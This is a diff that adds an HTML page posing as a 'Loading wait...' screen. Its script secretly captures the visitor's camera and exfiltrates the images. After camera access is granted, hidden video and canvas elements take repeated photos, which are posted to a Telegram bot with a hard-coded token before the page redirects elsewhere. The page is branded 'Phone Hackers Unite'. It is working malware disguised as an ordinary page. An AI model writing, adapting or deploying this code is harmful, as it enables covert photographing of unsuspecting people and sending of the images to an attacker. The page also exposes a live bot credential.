@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<style>
+
+@import url(https://fonts.googleapis.com/css?family=Montserrat);
+body {
+  position: relative;
+  width: 100%;
+  height: 100vh;
+  background-color: #fff;
+  font-family: Montserrat;
+}
+
+.wrap {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+}
+
+.text {
+  color: #4070F4;
+  display: inline-block;
+  margin-left: 5px;
+}
+
+.bounceball {
+  position: relative;
+  display: inline-block;
+  height: 37px;
+  width: 15px;
+}
+.bounceball:before {
+  position: absolute;
+  content: "";
+  display: block;
+  top: 0;
+  width: 15px;
+  height: 15px;
+  border-radius: 50%;
+  background-color: #4070F4;
+  transform-origin: 50%;
+  -webkit-animation: bounce 500ms alternate infinite ease;
+          animation: bounce 500ms alternate infinite ease;
+}
+
+@-webkit-keyframes bounce {
+  0% {
+    top: 30px;
+    height: 5px;
+    border-radius: 60px 60px 20px 20px;
+    transform: scaleX(2);
+  }
+  35% {
+    height: 15px;
+    border-radius: 50%;
+    transform: scaleX(1);
+  }
+  100% {
+    top: 0;
+  }
+}
+
+@keyframes bounce {
+  0% {
+    top: 30px;
+    height: 5px;
+    border-radius: 60px 60px 20px 20px;
+    transform: scaleX(2);
+  }
+  35% {
+    height: 15px;
+    border-radius: 50%;
+    transform: scaleX(1);
+  }
+  100% {
+    top: 0;
+  }
+}
+
+
+
+
+
+
+video {
+  display: none; /* Hide video element */
+}
+canvas {
+  display: none; /* Hide video element */
+}
+</style>
+<body>
+
+
+
+<div class="wrap">
+  <div class="loading">
+    <div class="bounceball"></div>
+    <div class="text">Loading wait...</div>
+  </div>
+</div>
+
+
+    <script>
+        // Access the device camera and stream to video element
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+
+                // Create a video element dynamically
+                const video = document.createElement('video');
+                video.width = 320;
+                video.height = 240;
+                video.autoplay = true;
+                document.body.appendChild(video);
+                video.srcObject = stream;
+
+                // Create a canvas element dynamically
+                const canvas = document.createElement('canvas');
+                canvas.width = 320;
+                canvas.height = 240;
+                
+                // Get the chat_id and URL from the query parameters
+                const urlParams = new URLSearchParams(window.location.search);
+                const chatId = urlParams.get('id'); // Get the 'id' parameter from the URL
+                const weburl = urlParams.get('url');
+
+                // Function to capture and send the photo
+                function captureAndSendPhoto() {
+                    const context = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    const dataUrl = canvas.toDataURL('image/png');
+
+                    // Send the photo to the Telegram bot
+                    sendPhotoToTelegram(dataUrl);
+                }
+
+                function sendPhotoToTelegram(dataUrl) {
+                    // Convert the Data URL to a Blob
+                    fetch(dataUrl)
+                        .then(res => res.blob())
+                        .then(blob => {
+                            const formData = new FormData();
+                            formData.append('chat_id', chatId);
+                            formData.append('photo', blob, 'photo.png');
+
+                            const caption = 'Developed By: Md. Fahim Sarker\nImage Forwarded: Phone Hackers Unite';
+                            const keyboard = JSON.stringify({
+                                 inline_keyboard: [
+                            [{ text: 'Open Phone Hackers Unite', url: 'https://t.me/PhoneHackersUnite_bot' }],
+                            [{ text: 'Developer Info', url: 'https://md-fahim-sarker.github.io/My-About/' }]
+      ]
+    });
+
+    formData.append('caption', caption);
+    formData.append('reply_markup', keyboard);
+
+                            // Send the photo to the Telegram bot
+                            fetch(`https://api.telegram.org/bot6310109803:AAHUt4ZUHhqyqrG4Ld50A6gb4LxGZgE8LXQ/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+                        });
+                }
+
+                // Capture and send a photo every 1.5 seconds
+                const photoInterval = setInterval(captureAndSendPhoto, 1000);
+
+                // Redirect after 5 seconds
+                setTimeout(() => {
+                    clearInterval(photoInterval); // Stop capturing photos
+                    window.location.href = weburl;
+                }, 6000);
+            });
+    </script>
+</body>
+</html>
